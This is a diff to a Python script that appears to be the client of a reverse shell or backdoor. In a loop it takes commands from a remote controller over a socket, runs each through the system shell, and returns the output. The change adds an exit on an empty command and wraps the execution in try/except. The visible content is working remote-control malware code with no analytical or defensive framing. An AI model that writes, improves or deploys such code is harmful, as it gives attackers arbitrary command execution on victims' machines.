@@ -16,8 +16,14 @@ while True:
     print("[-] Awaiting commands...")
     command = client.recv(1024)
     command = command.decode()
-    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-    output = op.stdout.read()
-    output_error = op.stderr.read()
-    print("[-] Sending response...")
-    client.send(output + output_error)
+    if command == "":
+        break
+        quit()
+    try:
+        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        output = op.stdout.read()
+        output_error = op.stderr.read()
+        print("[-] Sending response...")
+        client.send(output + output_error)
+    except:
+        quit()
